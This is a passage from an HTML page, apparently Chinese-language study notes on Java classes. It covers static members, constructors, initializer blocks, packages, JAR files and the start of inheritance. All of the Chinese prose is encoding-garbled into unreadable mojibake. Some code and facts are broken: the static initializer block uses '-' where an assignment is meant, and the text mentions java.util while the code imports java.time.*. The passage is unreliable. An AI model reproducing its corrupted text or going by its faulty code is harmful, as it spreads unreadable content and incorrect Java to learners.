punctuation">;</span></code></pre><p>staff[0]ÂØπË±°ÁöÑ<code>getOtherName</code>ÊñπÊ≥ïËøòÂèØ‰ª•ËÆøÈóÆotherÂØπË±°ÁöÑÁßÅÊúâÂ≠óÊÆµnameÔºåÊòØÂõ†‰∏∫‰ªñ‰ª¨ÈÉΩÊòØ<code>Employee</code>Á±ªÂûãÂØπË±°Ôºå<code>Employee</code>Á±ªÁöÑÊñπÊ≥ïÂèØ‰ª•ËÆøÈóÆ‰ªªÊÑè<code>Employee</code>Á±ªÂûãÂØπË±°ÁöÑÁßÅÊúâÂ≠óÊÆµ„ÄÇ</p><p>ÂèØ‰ª•Â∞ÜÂÆû‰æãÂ≠óÊÆµÂÆö‰πâ‰∏∫final„ÄÇËøôÊ†∑ÁöÑÂ≠óÊÆµÂøÖÈ°ªÂú®ÊûÑÈÄ†ÂØπË±°Êó∂ÂàùÂßãÂåñÔºåÂπ∂‰∏î‰ª•Âêé‰∏çËÉΩÂÜç‰øÆÊîπËøô‰∏™Â≠óÊÆµ„ÄÇ</p><p>Â¶ÇÊûúÁ±ª‰∏≠ÁöÑÊâÄÊúâÊñπÊ≥ïÈÉΩ‰∏ç‰ºöÊîπÂèòÂÖ∂ÂØπË±°ÔºåËøôÊ†∑ÁöÑÁ±ªÂ∞±ÊòØ‰∏çÂèØÂèòÁöÑÁ±ª„ÄÇ</p><p><strong>ÈùôÊÄÅÂ≠óÊÆµ</strong></p><p>Â¶ÇÊûúÂ∞Ü‰∏Ä‰∏™Â≠óÊÆµÂÆö‰πâ‰∏∫staticÔºåÊØè‰∏™Á±ªÂè™Êúâ‰∏Ä‰∏™ËøôÊ†∑ÁöÑÂ≠óÊÆµ„ÄÇËÄåÂØπ‰∫éÈùûÈùôÊÄÅÁöÑÂÆû‰æãÂ≠óÊÆµÔºåÊØè‰∏™ÂØπË±°ÈÉΩÊúâËá™Â∑±ÁöÑ‰∏Ä‰∏™ÂâØÊú¨„ÄÇ</p><p>ÈùôÊÄÅÂ≠óÊÆµÂ±û‰∫éÁ±ªÔºåËÄå‰∏çÂ±û‰∫é‰ªª‰ΩïÂçï‰∏™ÁöÑÂØπË±°„ÄÇ</p><p><strong>ÈùôÊÄÅÂ∏∏Èáè</strong></p><p>ÈùôÊÄÅÂ∏∏ÈáèÂæàÂ∏∏Áî®Ôºå‰æãÂ¶ÇÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">PI</span> <span class="token operator">=</span> <span class="token number">3.141592653</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Áî®<code>Employee.PI</code>Êù•ËÆøÈóÆËøô‰∏™ÈùôÊÄÅÂ∏∏Èáè„ÄÇ</p><p><strong>ÈùôÊÄÅÊñπÊ≥ï</strong></p><p>ÈùôÊÄÅÊñπÊ≥ïÊòØ‰∏çÂú®ÂØπË±°‰∏äÊâßË°åÁöÑÊñπÊ≥ï„ÄÇ‰æãÂ¶ÇMathÁ±ªÁöÑpowÊñπÊ≥ï„ÄÇ</p><p>ÂèØ‰ª•ËÆ§‰∏∫ÈùôÊÄÅÊñπÊ≥ïÊòØÊ≤°Êúâ<code>this</code>ÂèÇÊï∞ÁöÑÊñπÊ≥ïÔºàÊ≤°ÊúâÈöêÂºèÂèÇÊï∞Ôºâ</p><p>ÈùôÊÄÅÊñπÊ≥ï‰∏çËÉΩËÆøÈóÆÂÆû‰æãÂ≠óÊÆµÔºå‰ΩÜÊòØÂèØ‰ª•ËÆøÈóÆÈùôÊÄÅÂ≠óÊÆµ„ÄÇ</p><p>Âª∫ËÆÆ‰ΩøÁî®Á±ªÂêçËÄå‰∏çÊòØÂØπË±°Êù•Ë∞ÉÁî®ÈùôÊÄÅÊñπÊ≥ï„ÄÇ</p><p>‰∏ãÈù¢‰∏§ÁßçÊÉÖÂÜµ‰∏ãÂèØ‰ª•‰ΩøÁî®ÈùôÊÄÅÊñπÊ≥ïÔºö</p><ul><li>ÊñπÊ≥ï‰∏çÈúÄË¶ÅËÆøÈóÆÂØπË±°Áä∂ÊÄÅÔºåÂõ†‰∏∫ÂÆÉÈúÄË¶ÅÁöÑÊâÄÊúâÂèÇÊï∞ÈÉΩÈÄöËøáÊòæÂºèÂèÇÊï∞Êèê‰æõ„ÄÇ</li><li>ÊñπÊ≥ïÂè™ÈúÄË¶ÅËÆøÈóÆÁ±ªÁöÑÈùôÊÄÅÂ≠óÊÆµ„ÄÇ</li></ul><p><strong>JavaÁ®ãÂ∫èËÆæËÆ°ËØ≠Ë®ÄÊÄªÊòØÈááÁî®ÊåâÂÄºË∞ÉÁî®„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåÊñπÊ≥ïÂæóÂà∞ÁöÑÊòØÊâÄÊúâÂèÇÊï∞ÂÄºÁöÑ‰∏Ä‰∏™ÂâØÊú¨„ÄÇ</strong>ÂÖ∑‰ΩìÊù•ËÆ≤ÔºåÊñπÊ≥ï‰∏çËÉΩ‰øÆÊîπ‰º†ÈÄíÁªôÂÆÉÁöÑ‰ªª‰ΩïÂèÇÊï∞ÂèòÈáèÁöÑÂÜÖÂÆπ„ÄÇ</p><p>ÊñπÊ≥ïÂæóÂà∞ÁöÑÊòØÂØπË±°ÂºïÁî®ÁöÑÂâØÊú¨ÔºåÂéüÊù•ÁöÑÂØπË±°ÂºïÁî®ÂíåËøô‰∏™ÂâØÊú¨ÈÉΩÂºïÁî®Âêå‰∏Ä‰∏™ÂØπË±°„ÄÇ</p><p>ÂÆûÈôÖ‰∏äÔºåÂØπË±°ÂºïÁî®ÊòØÊåâÂÄº‰º†ÈÄíÁöÑ„ÄÇ</p><ul><li>ÊñπÊ≥ï‰∏çËÉΩ‰øÆÊîπÂü∫Êú¨Êï∞ÊçÆÁ±ªÂûãÁöÑÂèÇÊï∞„ÄÇ</li><li>ÊñπÊ≥ïÂèØ‰ª•ÊîπÂèòÂØπË±°ÂèÇÊï∞ÁöÑÁä∂ÊÄÅ„ÄÇ</li><li>ÊñπÊ≥ï‰∏çËÉΩËÆ©‰∏Ä‰∏™ÂØπË±°ÂèÇÊï∞ÂºïÁî®‰∏Ä‰∏™Êñ∞ÁöÑÂØπË±°„ÄÇ</li></ul><p><strong>ÈáçËΩΩ</strong></p><p>Â¶ÇÊûúÂ§ö‰∏™ÊñπÊ≥ïÊúâÁõ∏ÂêåÁöÑÂêçÂ≠ó„ÄÅ‰∏çÂêåÁöÑÂèÇÊï∞Ôºå‰æøÂá∫Áé∞‰∫ÜÈáçËΩΩ„ÄÇÁºñËØëÂô®ÂøÖÈ°ªÊåëÈÄâÂá∫ÂÖ∑‰ΩìË∞ÉÁî®Âì™‰∏™ÊñπÊ≥ï„ÄÇ</p><blockquote><p>JavaÂÖÅËÆ∏ÈáçËΩΩ‰ªª‰ΩïÊñπÊ≥ïÔºåËÄå‰∏çÂè™ÊòØÊûÑÈÄ†Âô®ÊñπÊ≥ï„ÄÇÂõ†Ê≠§ÔºåË¶ÅÂÆåÊï¥Âú∞ÊèèËø∞‰∏Ä‰∏™ÊñπÊ≥ïÔºåÈúÄË¶ÅÊåáÂÆöÊñπÊ≥ïÂêç‰ª•ÂèäÂèÇÊï∞Á±ªÂûã„ÄÇËøôÂè´ÂÅöÊñπÊ≥ïÁöÑÁ≠æÂêç„ÄÇ</p><p><strong>ËøîÂõûÁ±ªÂûã‰∏çÊòØÊñπÊ≥ïÁ≠æÂêçÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇ‰πüÂ∞±ÊòØËØ¥Ôºå‰∏çËÉΩÊúâ‰∏§‰∏™ÂêçÂ≠óÁõ∏Âêå„ÄÅÁ±ªÂûãÂèÇÊï∞‰πüÁõ∏ÂêåÂç¥Êúâ‰∏çÂêåËøîÂõûÁ±ªÂûãÁöÑÊñπÊ≥ï„ÄÇ</strong></p></blockquote><p>Â¶ÇÊûúÂú®ÊûÑÈÄ†Âô®‰∏≠Ê≤°ÊúâÊòæÂºèÂú∞‰∏∫Â≠óÊÆµËÆæÁΩÆÂÄºÔºåÈÇ£‰πàÂ∞±‰ºöË¢´Ëá™Âä®Âú∞Ëµã‰∏∫ÈªòËÆ§ÂÄºÔºöÊï∞ÂÄº‰∏∫0„ÄÅÂ∏ÉÂ∞îÂÄº‰∏∫false„ÄÅÂØπË±°ÂºïÁî®‰∏∫null„ÄÇ</p><blockquote><p>ÊñπÊ≥ï‰∏≠ÁöÑÂ±ÄÈÉ®ÂèòÈáèÂøÖÈ°ªÊòéÁ°ÆÂú∞ÂàùÂßãÂåñÔºå‰ΩÜÊòØÂú®Á±ª‰∏≠ÔºåÂ¶ÇÊûúÊ≤°ÊúâÂàùÂßãÂåñÁ±ª‰∏≠ÁöÑÂ≠óÊÆµÔºåÂ∞Ü‰ºöËá™Âä®ÂàùÂßãÂåñ‰∏∫ÈªòËÆ§ÂÄº„ÄÇ</p></blockquote><p>Êó†ÂèÇÊûÑÈÄ†Âô®ÂàõÂª∫ÂØπË±°Êó∂ÔºåÂØπË±°ÁöÑÁä∂ÊÄÅ‰ºöËÆæÁΩÆ‰∏∫ÈÄÇÂΩìÁöÑÈªòËÆ§ÂÄº„ÄÇÂ¶ÇÊûúÂÜô‰∏Ä‰∏™Á±ªÊó∂Ê≤°ÊúâÁºñÂÜôÊûÑÈÄ†Âô®ÔºåÂ∞±‰ºö‰∏∫‰Ω†Êèê‰æõ‰∏Ä‰∏™Êó†ÂèÇÊï∞ÊûÑÈÄ†Âô®„ÄÇËøô‰∏™ÊûÑÈÄ†Âô®Â∞ÜÊâÄÊúâÁöÑÂÆû‰æãÂ≠óÊÆµËÆæÁΩÆ‰∏∫ÈªòËÆ§ÂÄº„ÄÇ</p><p>Â¶ÇÊûúÁ±ª‰∏≠Êèê‰æõ‰∫ÜËá≥Â∞ë‰∏Ä‰∏™ÊûÑÈÄ†Âô®Ôºå‰ΩÜÊòØÊ≤°ÊúâÊèê‰æõÊó†ÂèÇÊï∞ÁöÑÊûÑÈÄ†Âô®ÔºåÈÇ£‰πàÊûÑÈÄ†ÂØπË±°Êó∂Â¶ÇÊûú‰∏çÊèê‰æõÂèÇÊï∞Â∞±ÊòØ‰∏çÂêàÊ≥ïÁöÑ„ÄÇ</p><p>ÂèØ‰ª•Âú®Á±ªÂÆö‰πâ‰∏≠Áõ¥Êé•‰∏∫‰ªª‰ΩïÂ≠óÊÆµËµãÂÄºÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token operator">=</span><span class="token string">"feng"</span><span class="token punctuation">;</span></code></pre><p>ÂàùÂßãÂÄº‰∏ç‰∏ÄÂÆöÊòØÂ∏∏ÈáèÂÄºÔºåÂèØ‰ª•Âà©Áî®ÊñπÊ≥ïË∞ÉÁî®ÂàùÂßãÂåñ‰∏Ä‰∏™Â≠óÊÆµÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> nextId <span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token operator">=</span> <span class="token function">assignId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">assignId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> r <span class="token operator">=</span> nextId<span class="token punctuation">;</span>    nextId<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> r<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>Ë∞ÉÁî®Âè¶‰∏Ä‰∏™ÊûÑÈÄ†Âô®</strong></p><p>ÂÖ≥ÈîÆÂ≠ó<code>this</code>ÊåáÁ§∫‰∏Ä‰∏™ÊñπÊ≥ïÁöÑÈöêÂºèÂèÇÊï∞„ÄÇÊ≠§Â§ñÔºåÂ¶ÇÊûúÊûÑÈÄ†Âô®ÁöÑ<strong>Á¨¨‰∏Ä‰∏™ËØ≠Âè•</strong>ÂΩ¢Â¶Ç<code>this(...)</code>ÔºåËøô‰∏™ÊûÑÈÄ†Âô®Â∞ÜË∞ÉÁî®Âêå‰∏Ä‰∏™Á±ªÁöÑÂè¶‰∏Ä‰∏™ÊûÑÈÄ†Âô®„ÄÇ</p><p><strong>ÂàùÂßãÂåñÂùó(‰∏çÂ∏∏ËßÅ)</strong></p><p>Âú®‰∏Ä‰∏™Á±ªÁöÑÂ£∞Êòé‰∏≠ÔºåÂèØ‰ª•ÂåÖÂê´‰ªªÊÑèÂ§ö‰∏™‰ª£Á†ÅÂùó„ÄÇÂè™Ë¶ÅÊûÑÈÄ†Ëøô‰∏™Á±ªÁöÑÂØπË±°ÔºåËøô‰∫õÂùóÂ∞±‰ºöË¢´ÊâßË°å„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>    id <span class="token operator">=</span> nextId<span class="token punctuation">;</span>    nextId <span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>È¶ñÂÖà</strong>ËøêË°åÂàùÂßãÂåñÂùóÔºåÁÑ∂ÂêéÊâçËøêË°åÊûÑÈÄ†Âô®ÁöÑ‰∏ª‰ΩìÈÉ®ÂàÜ„ÄÇÈÄöÂ∏∏Áõ¥Êé•ÊääÂàùÂßãÂåñ‰ª£Á†ÅÊîæÂú®ÊûÑÈÄ†Âô®‰∏≠„ÄÇ</p><p>Â¶ÇÊûúÁ±ªÁöÑÈùôÊÄÅÂ≠óÊÆµÈúÄË¶ÅÂæàÂ§çÊùÇÁöÑÂàùÂßãÂåñ‰ª£Á†ÅÔºåÈÇ£‰πàÂèØ‰ª•‰ΩøÁî®ÈùôÊÄÅÁöÑÂàùÂßãÂåñÂùóÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> generator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    nextId <span class="token operator">-</span> generator<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>Áî±‰∫éJava‰ºöÂÆåÊàêËá™Âä®ÁöÑÂûÉÂúæÂõûÊî∂Ôºå‰∏çÈúÄË¶Å‰∫∫Â∑•ÂõûÊî∂ÂÜÖÂ≠òÔºåÊâÄ‰ª•Java‰∏çÊîØÊåÅÊûêÊûÑÂô®„ÄÇ</strong></p><p><strong>ÂåÖ</strong></p><blockquote><p>JavaÂÖÅËÆ∏‰ΩøÁî®ÂåÖÂ∞ÜÁ±ªÁªÑÁªáÂú®‰∏Ä‰∏™ÈõÜÂêà‰∏≠„ÄÇÂÄüÂä©ÂåÖÂèØ‰ª•Êñπ‰æøÂú∞ÁªÑÁªáËá™Â∑±ÁöÑ‰ª£Á†ÅÔºåÂπ∂Â∞ÜËá™Â∑±ÁöÑ‰ª£Á†Å‰∏éÂà´‰∫∫Êèê‰æõÁöÑ‰ª£Á†ÅÂ∫ìÂàÜÂºÄÁÆ°ÁêÜ„ÄÇ</p></blockquote><p>‰ΩøÁî®ÂåÖÁöÑ‰∏ªË¶ÅÂéüÂõ†ÊòØÁ°Æ‰øùÁ±ªÂêçÁöÑÂîØ‰∏ÄÊÄß„ÄÇ‰∏∫‰∫Ü‰øùËØÅÂåÖÂêçÁöÑÁªùÂØπÂîØ‰∏ÄÊÄßÔºåË¶ÅÁî®‰∏Ä‰∏™Âõ†ÁâπÁΩëÂüüÂêç‰ª•ÈÄÜÂ∫èÁöÑÂΩ¢Âºè‰Ωú‰∏∫ÂåÖÂêçÔºåÁÑ∂ÂêéÂØπ‰∫é‰∏çÂêåÁöÑÂ∑•Á®ã‰ΩøÁî®‰∏çÂêåÁöÑÂ≠êÂåÖ„ÄÇ</p><p><strong>‰∏Ä‰∏™Á±ªÂèØ‰ª•‰ΩøÁî®ÊâÄÂ±ûÂåÖ‰∏≠ÁöÑÊâÄÊúâÁ±ªÔºå‰ª•ÂèäÂÖ∂‰ªñÂåÖ‰∏≠ÁöÑÂÖ¨ÂÖ±Á±ª</strong></p><p>ÂèØ‰ª•‰ΩøÁî®importËØ≠Âè•ÂØºÂÖ•‰∏Ä‰∏™ÁâπÂÆöÁöÑÁ±ªÊàñËÄÖÊï¥‰∏™ÂåÖ„ÄÇimportËØ≠Âè•Â∫îËØ•‰Ωç‰∫éÊ∫êÊñá‰ª∂ÁöÑÈ°∂ÈÉ®Ôºà‰ΩÜ‰Ωç‰∫épackageËØ≠Âè•ÁöÑÂêéÈù¢Ôºâ„ÄÇ</p><p>‰æãÂ¶ÇÂØºÂÖ•<code>java.util</code>ÂåÖ‰∏≠ÁöÑÊâÄÊúâÁ±ªÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>time<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span></code></pre><p>Âè™ËÉΩ‰ΩøÁî®ÊòüÂè∑ÂØºÂÖ•‰∏Ä‰∏™ÂåÖÔºåËÄå‰∏çËÉΩ‰ΩøÁî®<code>import java.*</code>ÊàñËÄÖ<code>import java.*.*</code>ÂØºÂÖ•ÊâÄÊúâ‰ª•java‰∏∫ÂâçÁºÄÁöÑÂåÖ„ÄÇ</p><p>Êúâ‰∏ÄÁßçimport ËØ≠Âè•ÂÖÅËÆ∏ÂØºÂÖ•ÈùôÊÄÅÊñπÊ≥ïÂíåÈùôÊÄÅÂ≠óÊÆµÔºåËÄå‰∏çÂè™ÊòØÁ±ª„ÄÇ‰æãÂ¶ÇÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token import static"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token operator">*</span></span><span class="token punctuation">;</span></code></pre><p>Â∞±ÂèØ‰ª•‰ΩøÁî®<code>System</code>Á±ªÁöÑÈùôÊÄÅÊñπÊ≥ïÂíåÈùôÊÄÅÂ≠óÊÆµÔºåËÄå‰∏çÂøÖÂä†Á±ªÂâçÁºÄ„ÄÇ</p><p>Ë¶ÅÊÉ≥Â∞ÜÁ±ªÊîæÂÖ•ÂåÖ‰∏≠ÔºåÂ∞±ÂøÖÈ°ªÂ∞ÜÂåÖÁöÑÂêçÂ≠óÊîæÂú®Ê∫êÊñá‰ª∂ÁöÑÂºÄÂ§¥ÔºåÂç≥ÊîæÂú®ÂÆö‰πâËøô‰∏™ÂåÖ‰∏≠ÂêÑ‰∏™Á±ªÁöÑ‰ª£Á†Å‰πãÂâç„ÄÇ</p><p>Â¶ÇÊûúÊ≤°ÊúâÂú®Ê∫êÊñá‰ª∂‰∏≠ÊîæÁΩÆpackageËØ≠Âè•ÔºåËøô‰∏™Ê∫êÊñá‰ª∂‰∏≠ÁöÑÁ±ªÂ∞±Â±û‰∫éÊó†ÂêçÂåÖ„ÄÇ</p><p>Â∞ÜÊ∫êÊñá‰ª∂ÊîæÂú®‰∏éÂÆåÊï¥ÂåÖÂêçÂåπÈÖçÁöÑÂ≠êÁõÆÂΩï‰∏≠„ÄÇ</p><p>JavaÂíåPhp‰∏çÂêåÁöÑÊòØÔºåJavaÂÖ∂ÂÆûÁÆóÊúâ4ÁßçËÆøÈóÆ‰øÆÈ•∞Á¨¶„ÄÇÂ¶ÇÊûúÊ≤°ÊúâÊåáÂÆöpublicÊàñprivateÔºåËøô‰∏™ÈÉ®ÂàÜÔºàÁ±ª„ÄÅÊñπÊ≥ïÊàñÂèòÈáèÔºâÂèØ‰ª•Ë¢´Âêå‰∏Ä‰∏™ÂåÖ‰∏≠ÁöÑÊâÄÊúâÊñπÊ≥ïËÆøÈóÆ„ÄÇ</p><blockquote><p>Á±ªÁöÑÊàêÂëò‰∏çÂÜôËÆøÈóÆ‰øÆÈ•∞Êó∂ÈªòËÆ§‰∏∫default„ÄÇÈªòËÆ§ÂØπ‰∫éÂêå‰∏Ä‰∏™ÂåÖ‰∏≠ÁöÑÂÖ∂‰ªñÁ±ªÁõ∏ÂΩì‰∫éÂÖ¨ÂºÄÔºàpublicÔºâÔºåÂØπ‰∫é‰∏çÊòØÂêå‰∏Ä‰∏™ÂåÖ‰∏≠ÁöÑÂÖ∂‰ªñÁ±ªÁõ∏ÂΩì‰∫éÁßÅÊúâÔºàprivateÔºâ</p></blockquote><p><img src="class.png" loading="lazy"></p><blockquote><p>JarÊñá‰ª∂‰ΩøÁî®ZIPÊ†ºÂºèÁªÑÁªáÊñá‰ª∂ÂíåÂ≠êÁõÆÂΩï„ÄÇÂèØ‰ª•‰ΩøÁî®‰ªª‰ΩïZIPÂ∑•ÂÖ∑Êü•ÁúãJARÊñá‰ª∂„ÄÇ</p></blockquote><p>‰∏∫‰∫Ü‰ΩøÁ±ªËÉΩÂ§üË¢´Â§ö‰∏™Á®ãÂ∫èÂÖ±‰∫´ÔºåÈúÄË¶ÅÂÅöÂà∞‰∏ãÈù¢Âá†ÁÇπÔºö</p><ol><li>ÊääÁ±ªÊñá‰ª∂ÊîæÂú®‰∏Ä‰∏™ÁõÆÂΩï‰∏≠„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÔºåËøôÁõÆÂΩïÊòØÂåÖÊ†ëÁä∂ÁªìÊûÑÁöÑÂü∫ÁõÆÂΩï„ÄÇ</li><li>Â∞ÜJARÊñá‰ª∂ÊîæÂú®‰∏Ä‰∏™ÁõÆÂΩï‰∏≠„ÄÇ</li><li>ËÆæÁΩÆÁ±ªË∑ØÂæÑ„ÄÇÁ±ªË∑ØÂæÑÊòØÊâÄÊúâÂåÖÂê´Á±ªÊñá‰ª∂ÁöÑË∑ØÂæÑÁöÑÈõÜÂêà„ÄÇ</li></ol><p>ÊúÄÂ•Ω‰ΩøÁî®-classpathÈÄâÈ°πÊåáÂÆöÁ±ªË∑ØÂæÑ„ÄÇ</p><p><strong>JARÊñá‰ª∂</strong></p><p>JARÊñá‰ª∂ÊòØÂéãÁº©ÁöÑÔºåÂÆÉ‰ΩøÁî®‰∫ÜÊàë‰ª¨ÁÜüÊÇâÁöÑZIPÂéãÁº©Ê†ºÂºè„ÄÇ</p><p>ÈÄöËøá‰∏ãÈù¢ÁöÑÂëΩ‰ª§ÂêØÂä®Á®ãÂ∫èÔºö</p><pre class="language-java" data-language="java"><code class="language-java">java <span class="token operator">-</span>jar xxxxxx<span class="token punctuation">.</span>jar</code></pre><p><strong>Á±ªËÆæËÆ°ÊäÄÂ∑ß</strong></p><ol><li>‰∏ÄÂÆöË¶Å‰øùËØÅÊï∞ÊçÆÁßÅÊúâ„ÄÇ</li><li>‰∏ÄÂÆöË¶ÅÂØπÊï∞ÊçÆËøõË°åÂàùÂßãÂåñ„ÄÇ</li><li>‰∏çË¶ÅÂú®Á±ª‰∏≠‰ΩøÁî®ËøáÂ§öÁöÑÂü∫Êú¨Á±ªÂûã„ÄÇ</li><li>‰∏çÊòØÊâÄÊúâÁöÑÂ≠óÊÆµÈÉΩÈúÄË¶ÅÂçïÁã¨ÁöÑÂ≠óÊÆµËÆøÈóÆÂô®ÂíåÂ≠óÊÆµÊõ¥ÊîπÂô®„ÄÇ</li><li>ÂàÜËß£ÊúâËøáÂ§öËÅåË¥£ÁöÑÁ±ª„ÄÇ</li><li>Á±ªÂêçÂíåÊñπÊ≥ïÂêçË¶ÅËÉΩÂ§ü‰ΩìÁé∞ÂÆÉ‰ª¨ÁöÑËÅåË¥£„ÄÇ</li><li>‰ºòÂÖà‰ΩøÁî®‰∏çÂèØÂèòÁöÑÁ±ª„ÄÇ</li></ol><h3 id="ÁªßÊâø"><a href="#ÁªßÊâø" class="headerlink" title="ÁªßÊâø"></a>ÁªßÊâø</h3><p><strong>ÁªßÊâø</strong>ÁöÑÂü∫Êú¨ÊÄùÊÉ≥ÊòØÔºåÂèØ‰ª•Âü∫‰∫éÂ∑≤ÊúâÁöÑÁ±ªÂàõÂª∫Êñ∞ÁöÑÁ±ª„ÄÇÁªßÊâøÂ∑≤Â≠òÂú®ÁöÑÁ±ªÂ∞±ÊòØÂ§çÁî®ÔºàÁªßÊâøÔºâËøô‰∫õÁ±ªÁöÑÊñπÊ≥ïÔºåËÄå‰∏îÂèØ‰ª•Â¢ûÂä†‰∏Ä‰∫õÊñ∞ÁöÑÊñπÊ≥ïÂíåÂ≠óÊÆµÔºå‰ΩøÊñ∞Á±ªËÉΩÂ§üÈÄÇÂ∫îÊñ∞ÁöÑÊÉÖÂÜµ„ÄÇ</p><h4 id="Á±ª„ÄÅË∂ÖÁ±ªÂíåÂ≠êÁ±ª"><a href="#Á±ª„ÄÅË∂ÖÁ±ªÂíåÂ≠êÁ±ª" class="headerlink" title="Á±ª„ÄÅË∂ÖÁ±ªÂíåÂ≠êÁ±ª"></a>Á±ª„ÄÅË∂ÖÁ±ªÂíåÂ≠êÁ±ª</h4><p>‰ΩøÁî®extendsË°®Á§∫ÁªßÊâø„ÄÇ</p><p>ÈÄöËøáÊãìÂ±ïË∂ÖÁ±ªÂÆö‰πâÂ≠êÁ±ªÁöÑÊó∂ÂÄôÔºåÂè™ÈúÄË¶ÅÊåáÂá∫Â≠êÁ±ª‰∏éË∂ÖÁ±ªÁöÑ‰∏çÂêå‰πãÂ§Ñ„ÄÇ</p><p>Âè™ÊúâÁà∂Á±ªÁöÑÊñπÊ≥ïËÉΩËÆøÈóÆÁà∂Á±ªÁöÑÁßÅÊúâÂ≠óÊÆµÔºåËøôÊÑèÂë≥Â¶ÇÊûúÂ≠êÁ±ªÁöÑÊñπÊ≥ï‰∏çËÉΩÁõ¥Êé•ËÆøÈóÆÁà∂Á±ªÁöÑÁßÅÊúâÂ≠óÊÆµÔºåÈúÄË¶Å‰ΩøÁî®ÂÖ¨ÂÖ±Êé•Âè£ÔºåÁ±ª‰ºº<code>getSalary()</code>ËøôÊ†∑ÁöÑÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>bonus<span class="token operator">+</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getSalary</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ËøôÈáå‰ΩøÁî®ÁöÑÊòØ<code>super.getSalary()</code>ÔºåÂõ†‰∏∫Êàë‰ª¨Â∏åÊúõË∞ÉÁî®ÁöÑÊòØË∂ÖÁ±ªÁöÑ<code>getSalary</code>ÊñπÊ≥ïÔºåËÄå‰∏çÊòØÂΩìÂâçÁ±ªÁöÑËøô‰∏™ÊñπÊ≥ï„ÄÇ</p><p>ÁªßÊâøÁªùÂØπ‰∏ç‰ºöÂà†Èô§‰ªª‰ΩïÂ≠óÊÆµÊàñÊñπÊ≥ï„ÄÇ</p><p>Â≠êÁ±ªÁöÑÊûÑÈÄ†Âô®Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Manager</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>    bonus <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><code>super(name,salary);</code>ÊòØË∞ÉÁî®Ë∂ÖÁ±ª<code>Employee</code>‰∏≠ÁöÑËøô‰∏™ÊûÑÈÄ†Âô®Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">double</span> salary<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>salary <span class="token operator">=</span> salary<span class="token punctuation">;</span><span class="token 